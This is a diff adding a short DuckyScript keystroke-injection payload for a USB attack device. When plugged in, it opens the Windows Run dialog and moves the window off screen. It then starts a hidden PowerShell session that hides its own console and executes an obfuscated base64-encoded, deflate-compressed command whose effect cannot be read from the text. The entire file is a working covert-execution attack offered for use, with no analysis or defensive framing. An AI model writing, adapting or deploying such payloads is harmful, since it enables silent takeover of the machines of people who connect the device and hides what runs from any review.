@@ -1,0 +1,13 @@
+DELAY 5000
+GUI r
+DELAY 250
+ALT SPACE
+STRING M
+DOWN
+REPEAT 40
+ENTER
+STRING powershell -w hidden iex '(Add-Type n -pas -m ''[DllImport(\"user32\")]public static extern int ShowWindow(int h,int n);'')::ShowWindow((gps -Id $pid).MainWindowHandle,0);Read-Host|iex'
+ENTER
+DELAY 1000
+STRING Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('DcbBCoIwGADgu9A7rAfQNSuQIKJDIJrHkrzN7XcONyfbr+Lb53f6hJWEChKQeySi984CieMeuDQQwl49CqdGjW6/1IG3BmI1zaRHnMKNUssH8InuEDERzlL0WinwVM5i2BhdNfZ0gI2GhhVNWZksjC2w4gsyzevL61p3pXpW7/PnBKldfmtWPBZuZmD3HIxxx+gQ/QE=')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
+ENTER
